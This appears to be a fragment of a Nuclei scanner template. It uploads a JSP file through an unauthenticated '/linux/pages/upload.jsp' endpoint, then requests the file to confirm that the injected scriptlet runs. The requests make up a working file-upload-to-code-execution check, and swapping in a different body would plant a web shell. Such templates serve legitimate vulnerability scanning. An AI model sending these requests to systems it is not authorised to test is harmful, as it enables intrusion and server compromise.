http:
- matchers:
  - dsl:
    - status_code==200 && contains(body_1, "success") && contains(body_2, "{{file_content}}")
    type: dsl
  matchers-condition: and
  raw:
  - 'POST /linux/pages/upload.jsp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    filename: {{file_name}}

    Accept-Encoding: gzip

    Content-Length: 25


    <% out.println("{{file_content}}");%>'
  - "GET /linux/{{file_name}} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
    \ (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0\
    \ Safari/537.36        \n\n"
